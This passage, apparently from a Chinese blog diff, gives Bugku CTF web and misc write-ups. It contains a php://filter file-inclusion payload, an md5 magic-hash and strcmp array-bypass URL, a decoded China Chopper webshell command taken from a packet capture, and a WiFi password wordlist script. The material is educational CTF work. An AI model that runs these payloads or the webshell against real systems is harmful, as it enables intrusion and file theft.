!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]])
+</code></pre>
+<p>运行出flag:</p>
+<pre><code>CTF&#123;whatfk&#125;
+</code></pre>
+<h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8005/post/" title="题目地址">题目地址</a></p>
+<p>打开题目后有个链接，尝试点击了下，url变为</p>
+<pre><code>http://120.24.86.145:8005/post/index.php?file=show.php
+</code></pre>
+<p>结合题目的提示，flag在index里。猜测是文件包含，然后尝试file=index.php和file=index，并没有结果，而且丧心病狂的返回了。上万条bugku的宣传。。</p>
+<p>然后尝试phpfilter协议读取index.php的内容</p>
+<pre><code>http://120.24.86.145:8005/post/index.php?file=php://filter/convert.base64-encode/resource=index.php
+</code></pre>
+<p>成功读取数据<br>​<br>    PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==<br>Base64解码得：</p>
+<pre><code>&lt;html&gt;
+&lt;title&gt;Bugku-ctf&lt;/title&gt;
+
+&lt;?php
+error_reporting(0);
+if(!$_GET[file])&#123;echo &#39;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#39;;&#125;
+$file=$_GET[&#39;file&#39;];
+if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
+    echo &quot;Oh no!&quot;;
+    exit();
+&#125;
+include($file); 
+//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;
+?&gt;
+&lt;/html&gt;
+</code></pre>
+<p>flag为：</p>
+<pre><code>flag&#123;edulcni_elif_lacol_si_siht&#125;
+</code></pre>
+<h2 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h2><p><a target="_blank" rel="noopener" href="http://47.93.190.246:49162/" title="题目地址">题目地址</a></p>
+<p>右键查看源代码，发现code.txt，点击获取源代码。</p>
+<pre><code>&lt;?php
+if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
+    $v1 = $_GET[&#39;v1&#39;];
+    $v2 = $_GET[&#39;v2&#39;];
+    $v3 = $_GET[&#39;v3&#39;];
+    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;
+        if(!strcmp($v3, $flag))&#123;
+            echo $flag;
+        &#125;
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<p>payload:<br>​<br>    <a target="_blank" rel="noopener" href="http://47.93.190.246:49162/?v1=QNKCDZO&amp;v2=s878926199a&amp;v3%5B1%5D=1">http://47.93.190.246:49162/?v1=QNKCDZO&amp;v2=s878926199a&amp;v3[1]=1</a></p>
+<p>flag为：<br>​<br>    SKCTF{Php_1s_tH3_B3St_L4NgUag3}</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p><a target="_blank" rel="noopener" href="http://123.206.31.85/files/9ba3671dc645c1c05d8690b28f90f969/2.rar" title="题目地址">题目地址</a></p>
+<p>这题分数虽然少，但是get到了新姿势。</p>
+<p>把文件下载下来，一通工具分析。。并没有找到什么有价值的东西。看了看writeup，才知道要通过Winhex修改图片文件显示的长和宽才可以，该图片实际在下面有flag，但是由于显示的宽度不够，导致下面的那一部分不能够显示。</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E9%9A%90%E5%86%992_1.png" srcset="/img/loading.gif"><br>图示中左侧表示图像的宽，右侧表示图像的高，解题思路，就是将01修改的大一些，使得图像可显示的高度变大，由此显示出flag</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E9%9A%90%E5%86%992_2.png" srcset="/img/loading.gif"></p>
+<p>这应该算是老套路了，但是我第一次见，记一下。</p>
+<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8002/misc/telnet/1.zip" title="题目地址">题目地址</a></p>
+<p>水题。。数据包用wireshark打开，题目提示telnet,随便右键选一个telnet类型的数据，右键追踪流，获得flag。</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-telnet-1.png" srcset="/img/loading.gif"></p>
+<h2 id="这是一张单纯的图片？"><a href="#这是一张单纯的图片？" class="headerlink" title="这是一张单纯的图片？"></a>这是一张单纯的图片？</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8002/misc/1.jpg" title="题目地址">题目地址</a></p>
+<p>使用神器StegSolve打开文件，然后File Format打开，发现有特殊的字符串</p>
+<pre><code>&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32; &amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;。
+</code></pre>
+<p>是unicode编码，网上找工具解开即可。</p>
+<pre><code>key&#123;you are right&#125;
+</code></pre>
+<h2 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h2><p>下载地址：</p>
+<pre><code>链接: http://pan.baidu.com/s/1gfvezBl 密码: y6gh
+</code></pre>
+<p>将音乐打开，听了一会，在左声道中听到了滴滴答答的声音。确定为摩尔斯电码，使用Audacity分析</p>
+<p>图片1</p>
+<p>放大后根据频谱将摩尔斯电码提取出来</p>
+<pre><code>..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.
+</code></pre>
+<p>解码得</p>
+<pre><code>5BC925649CB0188F52E617D70929191C
+</code></pre>
+<p>直接提交即可</p>
+<h2 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8002/misc/momo.jpg" title="下载地址">http://120.24.86.145:8002/misc/momo.jpg</a></p>
+<p>使用binwalk可以提取出来一个rar压缩包，经过测试是真正有密码。不是伪加密。。</p>
+<p>找了很多地方，也用工具爆破了。。没成功，忽然想起以前表哥们发的一加密压缩包的密码是汉字，尝试了下图片上的汉字。。竟然解开了。。</p>
+<p>解压获得</p>
+<pre><code>电报内容：
+..../-/-/.--./---.../-..-./-..-././-./-.-./---/-.././.-.-.-/-.-./..../.-/..../..-/---/.-.-.-/-.-./---/--/-..-.
+
+首长：我操你在逗我吗？你确定是他们纳粹发的吗？
+士兵：难道我弄错了？哦。。。等等是这一条
+
+内容：http://c.bugku.com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=
+ AES Key：@#@#￥%……￥￥%%……&amp;￥
+
+士兵：二维码真的扫不出来吗？？肯定可以扫出来
+</code></pre>
+<p>解码莫斯电码获得</p>
+<pre><code>HTTP//ENCODE.CHAHUO.COM/
+</code></pre>
+<p>访问后是一个解密网站，内容对应的那一个链接，直接访问是404，看样子<br>需要解密。使用key解密得</p>
+<pre><code>momoj2j.png
+</code></pre>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E5%A6%B9%E5%AD%90%E7%9A%84%E9%99%8C%E9%99%8C-1.png" srcset="/img/loading.gif"></p>
+<p>于是乎，访问</p>
+<pre><code>http://c.bugku.com/momoj2j.png
+</code></pre>
+<p>将获得的二维码反色一下即可获得flag</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E5%A6%B9%E5%AD%90%E7%9A%84%E9%99%8C%E9%99%8C-2.png" srcset="/img/loading.gif"></p>
+<p>flag为</p>
+<pre><code>KEY&#123;nitmzhen6&#125;
+</code></pre>
+<h2 id="Linux基础1"><a href="#Linux基础1" class="headerlink" title="Linux基础1"></a>Linux基础1</h2><p>无脑题。。右键Notepad++打开，搜索字符串key,获得flag</p>
+<p>flag为</p>
+<pre><code>KEY&#123;24f3627a86fc740a7f36ee2c7a1c124a&#125;
+</code></pre>
+<h2 id="图穷匕现"><a href="#图穷匕现" class="headerlink" title="图穷匕现"></a>图穷匕现</h2><p>下载图片后，右键查看属性-详细信息，获得提示</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E5%9B%BE%E7%A9%B7%E5%8C%95%E7%8E%B0-1.png" srcset="/img/loading.gif"></p>
+<p>根据提示，猜测在文件尾有线索，使用Winhex打开，发现类似16进制的相当长的字符串。</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E5%9B%BE%E7%A9%B7%E5%8C%95%E7%8E%B0-2.png" srcset="/img/loading.gif"></p>
+<p>将其复制出来，使用hackbar的16进制转字符串功能，将其转换并保存。转换出一堆坐标点。提示中有说画图，写脚本将其按照像素点的形式画出来</p>
+<p>脚本如下</p>
+<pre><code>#!Python3
+#-*-coding:utf-8-*-
+from PIL import Image
+
+file = open(&#39;data.txt&#39;,&#39;r&#39;)
+
+IM = Image.new(&quot;RGB&quot;,(272,272))
+for line in file:
+    x = line.strip().lstrip(&#39;(&#39;).rstrip(&#39;)&#39;)
+    tmp = x.split(&#39;,&#39;)
+    IM.putpixel((int(tmp[0]),int(tmp[1])),(255, 255, 255))
+
+file.close()
+IM.show()
+IM.save(&#39;re.png&#39;)
+</code></pre>
+<p>画出一个二维码，扫描获得flag</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E5%9B%BE%E7%A9%B7%E5%8C%95%E7%8E%B0-3.png" srcset="/img/loading.gif"></p>
+<p>flag为</p>
+<pre><code>flag&#123;40fc0a979f759c8892f4dc045e28b820&#125;
+</code></pre>
+<h2 id="Convert"><a href="#Convert" class="headerlink" title="Convert"></a>Convert</h2><p>打开txt文档，全是01..网上尝试二进制转字符串，发现开头为rar,看样子是压缩文件，使用python写脚本，将其按照8个一位的格式，写到文件里</p>
+<p>脚本如下</p>
+<pre><code>#!python3
+#-*-coding:utf-8-*-
+import binascii
+file1 = open(&#39;convert.txt&#39;,&#39;r&#39;)
+s = file1.read()
+file2 = open(&#39;re.rar&#39;,&#39;wb&#39;)
+s1 = &#39;&#39;
+
+for i in range(0,len(s),8):
+    if ((int(s[i:i+8],2))&lt;= 15):
+        print(hex(int(s[i:i+8],2)))
+        s1 = s1 + &#39;0&#39; + hex(int(s[i:i+8],2)).replace(&#39;0x&#39;,&#39;&#39;)
+        print (s1)
+    else:
+        s1 += hex(int(s[i:i+8],2)).replace(&#39;0x&#39;,&#39;&#39;)
+
+file2.write(binascii.a2b_hex(s1))
+</code></pre>
+<p>将写出来的rar文件打开，给了个图，叫做key.jpg。</p>
+<p>然后使用Winhex打开，找到一串base64</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-convert-1.png" srcset="/img/loading.gif"></p>
+<pre><code>ZmxhZ3swMWEyNWVhM2ZkNjM0OWM2ZTYzNWExZDAxOTZlNzVmYn0=  
+</code></pre>
+<p>解码获得flag</p>
+<pre><code>flag&#123;01a25ea3fd6349c6e635a1d0196e75fb&#125;
+</code></pre>
+<h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p><a target="_blank" rel="noopener" href="http://123.206.31.85/files/1741be6b8da0b40baab0db1dacee5680/conf.bin" title="题目地址">题目地址</a></p>
+<p>题目提示为</p>
+<pre><code>flag格式：
+flag&#123;宽带用户名&#125;
+</code></pre>
+<p>下载下来一个.bin的文件，使用NotePad++打开是乱码，看样子需要专用的工具，上网找到一款工具<br>​<br>    路由器密码查看器(RouterPassView)<br>使用工具打开，搜索Password，点几下就能找到</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E5%AE%BD%E5%B8%A6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2_1.png" srcset="/img/loading.gif"></p>
+<p>最终flag为</p>
+<pre><code>flag&#123;053700357621&#125;
+</code></pre>
+<h2 id="linux"><a href="#linux" class="headerlink" title="linux???"></a>linux???</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8002/misc/1.tar.gz" title="题目地址">题目地址</a><br>直接解压文件，从里面找到一个flag文件，<br>右键NotePad++打开，搜索key,点几下查找下一个就能找到flag</p>
+<p>flag为</p>
+<pre><code>key&#123;feb81d3834e2423c9903f4755464060b&#125;
+</code></pre>
+<h2 id="中国菜刀，不在web里？"><a href="#中国菜刀，不在web里？" class="headerlink" title="中国菜刀，不在web里？"></a>中国菜刀，不在web里？</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8002/misc/caidao.zip" title="题目地址">题目地址</a></p>
+<p>打开题目，给了一个数据包，既然是中国菜刀，那么过滤出所有http协议的数据来。有三条http的数据流</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80_1.png" srcset="/img/loading.gif"></p>
+<p>分别追踪每一个流，找到一点线索，</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80_2.png" srcset="/img/loading.gif"></p>
+<p>在第三条数据流中，解码传输的shell命令</p>
+<pre><code>123=array_map(&quot;ass&quot;.&quot;ert&quot;,array(&quot;ev&quot;.&quot;Al(\&quot;\\\$xx%3D\\\&quot;Ba&quot;.&quot;SE6&quot;.&quot;4_dEc&quot;.&quot;OdE\\\&quot;;@ev&quot;.&quot;al(\\\$xx(&#39;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEY9IkM6XFx3d3dyb290XFxmbGFnLnRhci5neiI7JGZwPUBmb3BlbigkRiwncicpO2lmKEBmZ2V0YygkZnApKXtAZmNsb3NlKCRmcCk7QHJlYWRmaWxlKCRGKTt9ZWxzZXtlY2hvKCdFUlJPUjovLyBDYW4gTm90IFJlYWQnKTt9O2VjaG8oIlhAWSIpO2RpZSgpOw%3D%3D&#39;));\&quot;);&quot;));
+</code></pre>
+<p>base64解码得</p>
+<pre><code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&#39;5.3.0&#39;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);$F=&quot;C:\\wwwroot\\flag.tar.gz&quot;;$fp=@fopen($F,&#39;r&#39;);if(@fgetc($fp))&#123;@fclose($fp);@readfile($F);&#125;else&#123;echo(&#39;ERROR:// Can Not Read&#39;);&#125;;echo(&quot;X@Y&quot;);die();÷￿ýÃ
+
+&lt;?php
+@ini_set(&quot;display_errors&quot;, &quot;0&quot;);
+@set_time_limit(0);
+if (PHP_VERSION &lt; &#39;5.3.0&#39;) &#123;
+    @set_magic_quotes_runtime(0);
+&#125;;
+echo (&quot;X@Y&quot;);
+$F = &quot;C:\\wwwroot\\flag.tar.gz&quot;;
+$fp = @fopen($F, &#39;r&#39;);
+if (@fgetc($fp)) &#123;
+    @fclose($fp);
+    @readfile($F);
+&#125; else &#123;
+    echo (&#39;ERROR:// Can Not Read&#39;);
+&#125;;
+echo (&quot;X@Y&quot;);
+die();
+?&gt;
+</code></pre>
+<p>看样子对flag.tar.gz进行了下载。所以服务器返回的数据中有flag，在Line-based text data右键，选择显示分组字节流，调整开始起点来除去开头的X@Y,然后将解码为改为压缩，可获取flag，如图所示</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80_3.png" srcset="/img/loading.gif"></p>
+<p>flag为</p>
+<pre><code>key&#123;8769fe393f2b998fa6a11afe2bfcd65e&#125;
+</code></pre>
+<h2 id="再来一道隐写"><a href="#再来一道隐写" class="headerlink" title="再来一道隐写"></a>再来一道隐写</h2><p><a target="_blank" rel="noopener" href="http://123.206.31.85/files/b708db278f74342e35dea4fe48ebed28/58d54bd3e134e.zip" title="题目地址">题目地址</a></p>
+<p>这题还是老套路，做题的时候binwalk和Stegsolve分析了下，没找到啥有价值的，忽然想到之前做题的时候，遇到的一个姿势——通过修改图片显示的长和宽来隐藏信息。</p>
+<p>使用Winhex打开图片，修改对应的值即可获得flag</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E5%86%8D%E6%9D%A5%E4%B8%80%E9%81%93%E9%9A%90%E5%86%99-1.png" srcset="/img/loading.gif"></p>
+<p>flag为</p>
+<pre><code>flag&#123;He1l0_d4_ba1&#125;
+</code></pre>
+<h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p><a target="_blank" rel="noopener" href="http://123.206.31.85/files/49256ea124f2f47866605e1d1f352150/wifi.cap" title="题目地址">题目地址</a></p>
+<p>题目描述</p>
+<pre><code>flag格式：flag&#123;你破解的WiFi密码&#125;
+
+tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你
+1391040**
+Goodluck!!
+</code></pre>
+<p>提示密码是手机号，先写个脚本跑个字典出来</p>
+<pre><code>#-*-coding:utf-8-*-
+
+s = &quot;1391040&quot;
+t = &quot;&quot;
+file = open(&#39;data.txt&#39;,&#39;w&#39;)
+
+for i in range(10):
+    for j in range(10):
+        for k in range(10):
+            for l in range(10):
+                t = s + str(i) + str(j) + str(k) + str(l)
+                file.write(t)
+                file.write(&#39;\n&#39;)
+file.close()
+</code></pre>
